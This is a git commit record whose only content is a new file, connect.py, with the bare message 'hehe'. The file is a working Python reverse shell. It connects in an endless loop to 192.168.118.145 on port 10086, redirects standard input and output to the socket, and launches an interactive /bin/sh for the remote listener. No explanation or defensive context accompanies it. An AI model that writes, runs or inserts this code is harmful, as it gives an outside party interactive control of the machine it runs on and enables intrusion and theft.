ec1c588b6aec18190bad6202d8cd9cd0b2d5f15a
Nero-Number-One <2572591652@qq.com>
2022-04-19 18:54:02 +0800

    hehe

---
+++ connect.py
@@ -0,0 +1,15 @@
+import socket
+import subprocess
+import os
+
+while True:
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("192.168.118.145",10086))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        p=subprocess.call(["/bin/sh","-i"])
+    except ConnectionRefusedError:
+        pass
+    
